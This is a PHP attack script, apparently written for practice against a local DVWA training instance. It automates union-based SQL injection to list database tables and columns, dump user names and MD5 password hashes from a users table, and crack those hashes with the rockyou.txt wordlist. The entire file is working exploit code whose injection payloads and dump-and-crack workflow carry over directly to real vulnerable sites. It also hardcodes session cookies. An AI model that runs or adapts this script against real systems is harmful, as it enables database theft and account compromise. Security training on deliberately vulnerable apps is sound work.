<?php
require 'vendor/autoload.php';
use \GuzzleHttp\Psr7\Request;
use  GuzzleHttp\Client;

$client = new Client();
$url = "http://localhost:8080/DVWA-master/vulnerabilities/sqli/?id=1%s&Submit=Submit#";
$paylod = " 'or 1=1 -- -";
$headers = ['Cookie' => 'security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e'];
$resetColor = "\e[39m";
$greenColor = "\e[0;32m";
echo "\e[5m". "this is script by kira\n\n";
function getTableName($url , $headers){
    $GetTableNamePayload =  "1'union select 1,GROUP_CONCAT( 0x0a,table_schema,':',table_name)FROM information_Schema.tables  -- -";
    $request = new Request('GET',sprintf($url ,$GetTableNamePayload) , $headers);
    $promise = $GLOBALS['client']->sendAsync($request)->then(function ($response) {
        
        $dom = new DOMDocument();
        @$dom->loadHTML($response->getBody());
        $pres = $dom->getElementsByTagName('pre');
        foreach($pres as $pre) :
            $pre_text = $pre->textContent;
            echo $GLOBALS['greenColor'] . substr($pre_text, 128,);
            echo $GLOBALS['resetColor'];
        endforeach;
    }); 
    $promise->wait();
}

function getColumnName($url , $headers){
    $GetColumnNamePayload =  "1'union select 1,GROUP_CONCAT(0x0a,table_schema , ':',column_name)FROM information_Schema.columns where table_name = 'users'  -- -";
    $request = new Request('GET',sprintf($url ,$GetColumnNamePayload) , $headers);
    $promise = $GLOBALS['client']->sendAsync($request)->then(function ($response) {
        
        $dom = new DOMDocument();
        @$dom->loadHTML($response->getBody());
        $pres = $dom->getElementsByTagName('pre');
        foreach($pres as $pre) :
            $pre_text = $pre->textContent;
            echo $GLOBALS['greenColor'] . substr($pre_text, 156,);
            echo $GLOBALS['resetColor'];
        endforeach;
    }); 
    $promise->wait();
}

function getAllUser($url , $headers){
    $GetUserPayload =  "1'union select 1,GROUP_CONCAT(0x0a,user) FROM users -- -";
    $request = new Request('GET',sprintf($url ,$GetUserPayload) , $headers);
    $promise = $GLOBALS['client']->sendAsync($request)->then(function ($response) {
        
        $dom = new DOMDocument();
        @$dom->loadHTML($response->getBody());
        $pres = $dom->getElementsByTagName('pre');
        $users = null;
        foreach($pres as $pre) :
            $pre_text = $pre->textContent;
            $text = substr($pre_text, 84,);
            $newText = str_replace("," , "" , $text);
            $users = explode("\n", $newText);
            print_r($users);
            echo $GLOBALS['resetColor'];
        endforeach;
        return $users;
    }); 
    $promise->wait();
}
function getAllPassword($url , $headers){
    $GetPasswordPayload =  "1'union select 1,GROUP_CONCAT(0x0a,password) FROM users -- -";
    $request = new Request('GET',sprintf($url ,$GetPasswordPayload) , $headers);
    $promise = $GLOBALS['client']->sendAsync($request)->then(function ($response) {
        
        $dom = new DOMDocument();
        @$dom->loadHTML($response->getBody());
        $pres = $dom->getElementsByTagName('pre');
        
        foreach($pres as $pre) :
            $pre_text = $pre->textContent;
            $text = substr($pre_text, 88,);
            $newText = str_replace("," , "" , $text);
            $GLOBALS['passwords']  =  explode("\n", $newText);
        endforeach;
        

    }); 
    $promise->wait();
    print_r($GLOBALS['passwords']);
    return $GLOBALS['passwords'];
}
echo $resetColor;

function BruteForce($passwordList , $passwordArray) {
    $file = new SplFileObject($passwordList);
    while(!$file -> eof()) :
        $passwords = $file -> fgets();
        $hash =  md5(str_replace("\n" , "" , $passwords));
        foreach($passwordArray as $index => $password):
            echo("\r".$hash. ":");
            echo $hash == $password ? $passwords . $GLOBALS['greenColor'] : null;
    endforeach;
    endwhile;
}

getTableName(url: $url , headers: $headers);
echo "\n\n";
getColumnName(url: $url , headers: $headers);
echo "\n\n";
getAllUser(url: $url , headers: $headers);
echo "\n\n";
BruteForce(passwordList: "../../rockyou.txt" , passwordArray: getAllPassword($url , $headers));

?>